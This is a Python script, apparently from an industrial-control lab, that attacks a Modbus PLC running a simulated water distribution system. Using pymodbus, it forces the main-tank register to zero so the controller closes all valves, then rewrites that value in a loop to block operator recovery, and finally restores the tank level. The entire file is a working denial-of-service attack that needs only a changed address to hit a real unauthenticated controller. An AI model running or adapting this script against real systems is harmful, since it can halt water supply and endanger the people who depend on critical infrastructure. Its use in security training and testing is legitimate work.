from pymodbus.client import ModbusTcpClient
import time

PLC = 'localhost'
PORT = 502

print("=" * 55)
print("  ATTACK 3: MAIN TANK DEPLETION / DoS")
print("  Target : Main tank register QW10")
print("=" * 55)

client = ModbusTcpClient(PLC, port=PORT)
if not client.connect():
    print("[ERROR] Cannot connect to PLC.")
    exit()

print("\n[+] Connected to PLC at {}:{}".format(PLC, PORT))

main = client.read_holding_registers(address=10, count=1)
tanks = client.read_holding_registers(address=1, count=3)
coils = client.read_coils(address=0, count=3)
print(f"[*] Main tank level  : {main.registers[0]} / 400")
print(f"[*] Sub-tank levels  : T1={tanks.registers[0]} T2={tanks.registers[1]} T3={tanks.registers[2]}")
print(f"[*] Valve states     : V1={coils.bits[0]} V2={coils.bits[1]} V3={coils.bits[2]}")

print("\n[ATTACK] Step 1 — Setting main tank to 0 (simulating full drain)...")
client.write_register(address=10, value=0)
time.sleep(1)

main = client.read_holding_registers(address=10, count=1)
coils = client.read_coils(address=0, count=3)
print(f"[RESULT] Main tank now: {main.registers[0]} / 400")
print(f"[RESULT] Valve states : V1={coils.bits[0]} V2={coils.bits[1]} V3={coils.bits[2]}")
print("[RESULT] Main tank EMPTY — PLC closes all valves. Sub-tanks will NOT fill!")
print("[RESULT] Entire water distribution system HALTED with one Modbus packet!")

time.sleep(5)

print("\n[ATTACK] Step 2 — Oscillating drain (keep resetting to 0 every second)...")
print("[ATTACK] This prevents recovery even if operator tries to refill...")
for i in range(5):
    client.write_register(address=10, value=0)
    main = client.read_holding_registers(address=10, count=1)
    print(f"[ATTACK] Cycle {i+1}: Main tank forced to {main.registers[0]}")
    time.sleep(1)

print("[RESULT] System cannot recover while attacker is active!")

time.sleep(2)

print("\n[RECOVERY] Restoring main tank to 400...")
client.write_register(address=10, value=400)
main = client.read_holding_registers(address=10, count=1)
print(f"[RESULT] Main tank restored: {main.registers[0]} / 400")

client.close()
print("\n[DONE] Attack 3 complete. One packet disrupted entire system.")
print("="*55)
